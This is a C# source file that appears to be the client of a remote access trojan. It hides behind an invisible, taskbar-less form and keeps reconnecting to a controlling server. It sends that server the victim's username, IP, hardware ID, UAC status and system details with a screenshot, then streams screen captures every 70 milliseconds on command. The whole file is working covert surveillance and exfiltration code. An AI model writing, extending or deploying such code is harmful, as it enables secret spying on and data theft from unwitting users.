using LazyServer;
using Newtonsoft.Json.Linq;
using PentestTools;
using System;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal static class Program
    {
        public static JObject config = GClass.config();
        public static int monitoridx = 0;
        private static CancellationTokenSource screenshotTokenSource;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Task.Run(RunClientAsync);
            Application.Run(new InvisibleForm());
        }

        static async Task RunClientAsync()
        {
            GClass.ShowCmd(GClass.IsTrue("debug"));

            var client = new LazyServerClient();
            await GClass.ReconnectLoop(client);

            client.Disconnected += async (s, e) => {
                await GClass.ReconnectLoop(client);
            };

            var ss = ScreenCapture.CaptureScreenWithCursor();

            await client.SendFileBytesWithMeta(ss, new JObject
            {
                ["msg"] = "alive",
                ["ip"] = await GClass.GetIp(),
                ["username"] = DeviceInfo.GetUsername(),
                ["os"] = DeviceInfo.GetOSInfo(),
                ["cpu"] = DeviceInfo.GetCPUInfo(),
                ["gpu"] = DeviceInfo.GetGPUInfo(),
                ["uac"] = DeviceInfo.GetUACStatus(),
                ["hwid"] = DeviceInfo.GetHWID(),
            }.ToString());

            client.MessageReceived += async (s, e) =>
            {
                try
                {
                    JObject message = JObject.Parse(e.Message);
                    string command = (string)message["command"];

                    switch (command)
                    {
                        case "ssloop":
                            await StartScreenshotLoopAsync(client, message); // pass the message!
                            break;

                        case "stopss":
                            StopScreenshotLoop();
                            break;
                    }
                }
                catch
                {
                    // optional error handling
                }
            };

        }

        static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
        {
            StopScreenshotLoop();
            screenshotTokenSource = new CancellationTokenSource();
            var token = screenshotTokenSource.Token;

            int quality = 100; // default

            if (message["quality"] != null)
            {
                string qualityStr = (string)message["quality"];
                if (qualityStr.EndsWith("%") && int.TryParse(qualityStr.TrimEnd('%'), out int qVal))
                {
                    quality = Math.Max(10, Math.Min(qVal, 100)); // manual clamp
                }
            }

            await Task.Run(async () =>
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        var screenshot = DeviceInfo.Capture(Screen.AllScreens[monitoridx], quality);
                        await client.SendFileBytesWithMeta(screenshot, new JObject
                        {
                            ["msg"] = "screenshot",
                            ["monitors"] = Screen.AllScreens.Length
                        }.ToString());
                    }
                    catch
                    {
                        // Handle exception if needed
                    }

                    await Task.Delay(70, token);
                }
            }, token);
        }



        static void StopScreenshotLoop()
        {
            if (screenshotTokenSource != null)
            {
                screenshotTokenSource.Cancel();
                screenshotTokenSource.Dispose();
                screenshotTokenSource = null;
            }
        }
    }

    public class InvisibleForm : Form
    {
        public InvisibleForm()
        {
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0;
            Load += (s, e) => Hide();
        }
    }
}
